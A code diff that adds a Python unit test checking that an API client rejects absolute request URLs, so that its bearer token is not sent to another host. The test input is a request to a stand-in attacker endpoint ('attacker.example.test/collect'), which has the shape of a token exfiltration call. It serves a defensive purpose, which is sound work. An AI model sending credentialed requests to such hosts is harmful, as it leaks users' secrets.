@@ -103,6 +103,11 @@ class ApiClientTests(unittest.TestCase):
         self.assertEqual(caught.exception.status_code, 302)
         self.assertEqual(len(calls), 1)
 
+    def test_rejects_absolute_request_url_to_prevent_bearer_token_leak(self):
+        with self.client_for(lambda request: httpx.Response(200, json={})) as client:
+            with self.assertRaises(ValueError):
+                client.get_json("https://attacker.example.test/collect")
+
     def test_timeout_is_configurable_and_invalid_base_url_is_rejected(self):
         with self.assertRaises(ValueError):
             ApiClient("ftp://api.example.test")
